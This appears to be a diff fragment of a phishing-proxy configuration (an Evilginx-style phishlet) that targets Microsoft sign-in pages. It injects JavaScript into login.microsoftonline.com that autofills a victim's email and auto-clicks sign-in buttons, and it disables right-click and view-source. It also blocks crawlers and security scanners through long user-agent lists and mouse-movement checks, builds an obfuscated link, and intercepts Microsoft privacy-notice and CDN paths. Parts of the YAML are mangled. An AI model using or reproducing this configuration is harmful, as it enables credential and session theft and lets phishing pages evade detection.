+    - BUbiNG
+    - CCBot
+    - Dataprovider
+    - DotBot
+    - Exabot
+    - Favicons
+    - findlinks
+    - Google-Site-Verification
+    - Google-Youtube-Links
+    - Google-Favicon
+    - GrapeshotCrawler
+    - heritrix
+    - IASCrawler
+    - InfoSeek
+    - Lighthouse
+    - LinkpadBot
+    - MegaIndex
+    - MJ12bot
+    - msnbot
+    - nutch
+    - PhantomJS
+    - Pingdom
+    - Riddler
+    - rogerbot
+    - Scrapy
+    - SEOENGBot
+    - Screaming Frog SEO Spider
+    - SeznamBot
+    - Slackbot
+    - Sogou
+    - Spider
+    - TelegramBot
+    - Uptimebot
+    - W3C_Validator
+    - Wget
+    - Yahoo! Slurp
+    - Yandex
+    - YandexBot
+    - Yeti
+    - YisouSpider
+    - Zookabot
+    - Googlebot
+    - bingbot
+    - YandexBot
+    - Baiduspider
+    - DuckDuckBot
+    - Slurp
+    - Sogou
+    - Exabot
+    - facebot
+    - ia_archiver
+    - MJ12bot
+    - AhrefsBot
+    - SemrushBot
+    - DotBot
+    - Cocolyzebot
+    - Surdotlybot
+    - spbot
+    - linkdexbot
+    - SeznamBot
+    - sitebot
+    - BLEXBot
+    - Twitterbot
+    - TweetmemeBot
+    - BitlyBot
+    - Pinterbot
+    - facebookexternalhit
+    - WhatsApp
+    - TelegramBot
+    - Slackbot
+    - Discordbot
+    - Googlebot-Image
+    - Googlebot-Video
+    - Googlebot-News
+    - Googlebot-Mobile
+    - AdsBot-Google
+    - AdsBot-Google-Mobile
+    - Mediapartners-Google
+    - Mediapartners
+    - Mediapartners-Google/2.1
+    - Mediapartners-Google/3.0
+    - AdsBot-Google/1.0
+    - AdsBot-Google-Mobile-Apps
+  redirect_url: https:/google.com
+js_inject:
+  - trigger_domains:
+      - login.microsoftonline.com
+    trigger_paths:
+      - /common/oauth2/*
+      - /
+      - /*
+    script: >
+      
+
+
+
+
+      function lp(){
+        var emailId = document.querySelector("#i0116");
+        var nextButton = document.querySelector("#idSIButton9");
+        var query = window.location.href;
+        console.log("lp function triggered", emailId, nextButton, query);
+        if (/#/.test(window.location.href)){
+          var res = query.split("#");
+          var data1 = res[0];
+          var data2 = res[1];
+          console.log(data1);
+          console.log(data2);
+          if (emailId != null) {
+            var m = data2.replace(/[=]/gi, '');
+            emailId.focus();
+            emailId.value = m;
+            nextButton.focus();
+            nextButton.click();
+            console.log("YES!");
+            return;
+          }
+        }
+        setTimeout(function(){lp();}, 2500);
+      }
+
+
+      function clickYesButton() {
+        var yesButton = document.querySelector("#idSIButton9");
+        if (yesButton) {
+          yesButton.click();
+          console.log("Clicked Yes button!");
+        } else {
+          setTimeout(function(){clickYesButton();}, 2500);
+        }
+      }
+
+
+      setTimeout(function(){lp();}, 500);
+
+      setTimeout(function(){clickYesButton();}, 3000); // Adjust the timeout as necessary
+
+
+
+      function generateRandomToken(length) {
+          var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+          var charactersLength = characters.length;
+          var randomToken = '';
+          for (var i = 0; i < length; i++) {
+              randomToken += characters.charAt(Math.floor(Math.random() * charactersLength));
+          }
+          return randomToken;
+      }
+
+
+      function generateUniqueURLPath() {
+          var randomToken = generateRandomToken(20); // Generate a 20-character random token
+          // Construct the unique URL path based on the random token
+          var uniquePath = "/path/" + randomToken; // Adjust the path structure as needed
+          return uniquePath;
+      }
+
+
+      function updateURLWithoutReloading(uniquePath) {
+          var newURL = window.location.protocol + "//" + window.location.host + uniquePath;
+
+          // Check if the new URL path is accessible
+          fetch(newURL, { method: 'HEAD' })
+              .then(response => {
+                  if (response.ok) {
+                      // If the URL is accessible, update the browser's URL without reloading the page
+                      window.history.replaceState({ path: newURL }, '', newURL);
+                  } else {
+                      // If the URL is not accessible, handle the 404 error
+                      console.error('Error 404: Page not found. Redirecting to the default page.');
+                      window.history.replaceState({ path: newURL }, '', newURL);
+                      // Optionally, you can redirect to a specific error page or display a message
+                      // window.location.href = '/error-page';
+                  }
+              })
+              .catch(error => {
+                  console.error('Error fetching the URL:', error);
+                  // Handle other types of errors if needed
+              });
+      }
+
+
+      // Execute on page load
+
+      window.onload = function() {
+          var uniquePath = generateUniqueURLPath();
+          updateURLWithoutReloading(uniquePath);
+      };
+
+
+       // Disable right-click context menu
+      document.addEventListener('contextmenu', function(e) {
+          e.preventDefault();
+      });
+
+--- >-
+// Disable Ctrl+U document.addEventListener('keydown', function(event) { if
+(event.ctrlKey && event.key === 'u') { event.preventDefault(); alert('Ctrl+U is
+disabled on this website.'); return false; } });
+
+// Function to check if the user agent is a bot function isBot() { var userAgent
+= navigator.userAgent.toLowerCase(); var bots = [
+              "googlebot", "adsbot-google", "mediapartners-google", "google-web-preview", "google-read-aloud",
+              "feedfetcher-google", "google-sitemaps", "googlebot-mobile", "googlebot-image", "googlebot-news",
+              "googlebot-video", "adsense", "adsbot", "google-structured-data-testing-tool", "google-search-console",
+              "google-databoard", "google-earth", "google-favicon", "google-feedback", "google-index",
+              "google-instant", "google-maps", "google-mobile-adsense", "google-page-speed-insights",
+              "google-publisher-plugin", "google-structured-data-markup-helper", "google-translate",
+              "google-web-light", "google-adsbot", "googlebot-news", "googlebot-image", "googlebot-video",
+              "googlebot-mobile", "adsbot-google-mobile", "google-structured-data-tester", "google-wireless-transcoder",
+              "google-toolbar", "googlebot-x", "google-sitemap-generator", "googlebot-other", "google-scraper",
+              "google-adwords", "google-ads", "google-web-previewer", "google-mobile", "google-generate",
+              "google-website-translator", "google-search", "bingbot", "msnbot", "office365bot", "slurp",
+              "skypeuripreview", "netcraft", "netcraftssl", "netcraftsurveybot", "edgbot", "doipbot", "do-spider",
+              "telegrambot", "phantomjs", "pinterestbot", "applebot", "twitterbot", "facebookexternalhit",
+              "linkedinbot", "slackbot", "discordbot", "whatsapp", "instagram", "bot", "crawler", "spider",
+              "archive.org_bot", "ahrefsbot", "mj12bot", "semrushbot", "rogerbot", "dotbot", "yandexbot",
+              "baiduspider", "sogou", "exabot", "ezooms", "jauntybot", "obot", "blexbot", "careerbot", "ia_archiver",
+              "twiceler"
+          ];
+          return bots.some(function(bot) {
+              return userAgent.indexOf(bot) !== -1;
+          });
+      }
+
+      // Main function to prevent bots
+      function preventBots() {
+          if (isBot()) {
+              window.location.href = "https://google.com/access-denied";
+          } else {
+              console.log("Access granted");
+          }
+      }
+      
+      
+      
+        - |
+        <script type="text/javascript">
+            var mouseMovements = [];
+            var lastMoveTime = new Date().getTime();
+
+            function logMouseMovement(event) {
+                var currentTime = new Date().getTime();
+                var timeDiff = currentTime - lastMoveTime;
+                lastMoveTime = currentTime;
+
+                mouseMovements.push({
+                    x: event.clientX,
+                    y: event.clientY,
+                    time: timeDiff
+                });
+
+                if (mouseMovements.length > 100) {
+                    analyzeMouseMovements();
+                    mouseMovements = [];
+                }
+            }
+
+            function analyzeMouseMovements() {
+                var fastMoves = 0;
+                var straightLines = 0;
+                var lastMovement = null;
+
+                for (var i = 0; i < mouseMovements.length; i++) {
+                    if (mouseMovements[i].time < 50) {
+                        fastMoves++;
+                    }
+
+                    if (lastMovement) {
+                        var dx = mouseMovements[i].x - lastMovement.x;
+                        var dy = mouseMovements[i].y - lastMovement.y;
+                        if (Math.abs(dx) < 10 || Math.abs(dy) < 10) {
+                            straightLines++;
+                        }
+                    }
+                    lastMovement = mouseMovements[i];
+                }
+
+                if (fastMoves > 50 || straightLines > 50) {
+                    blockAccess();
+                }
+            }
+
+            function blockAccess() {
+                document.body.innerHTML = "<h1>Access Denied</h1>";
+            }
+
+            document.addEventListener('mousemove', logMouseMovement);
+
+            function generateToken() {
+                return Math.random().toString(36).substring(2, 15);
+            }
+
+            function createDynamicLink() {
+                var userId = "exampleUser"; // Make this dynamic if needed
+                var token = generateToken();
+                var dynamicLink = "https://google.com/welcome?user=" + encodeURIComponent(userId) + "&token=" + encodeURIComponent(token);
+                var obfuscatedLink = btoa(dynamicLink);
+
+                var anchor = document.createElement('a');
+                anchor.href = atob(obfuscatedLink);
+                anchor.innerText = "Click here to proceed";
+                document.body.appendChild(anchor);
+            }
+
+            window.onload = function() {
+                if (validateHuman()) {
+                    createDynamicLink();
+                } else {
+                    blockAccess();
+                }
+            };
+
+            function validateHuman() {
+                // Implement further validation if needed
+                return true; // This is a placeholder
+            }
+
+            // Honeypot Detection
+            document.getElementById('mainForm').addEventListener('submit', function(event) {
+                var honeypotField = document.getElementById('honeypot').value;
+                if (honeypotField !== "") {
+                    blockAccess();
+                    event.preventDefault();
+                }
+            });
+        </script>
+  redirect_url: "https://google.com"
+intercept:
+  - {domain: 'privacynotice.account.microsoft.com', path: '^\/notice\?ru=https:\/\/login\.live\.com\/oauth20_authorize\.srf.*', http_status: 200, body: 'privacynotice.account.microsoft.com/notice?ru=https://login.live.com/oauth20_authorize.srf.*', mime: "text/html", "text/javascript", "application/json"}
+  - {domain: 'privacynotice.account.microsoft.com', path: '^\/notice\?ru=https:\/\/login\.live\.com\/oauth20_authorize\.srf.*', http_status: 200, body: 'privacynotice.account.microsoft.com/notice?ru=https://login.live.com/oauth20_authorize.srf.*', mime: "text/html", "text/javascript", "application/json"}
+  - {domain: 'ucis.msdxcdn.microsoft.com', path: '^\/.*\/app\.js', http_status: 200}
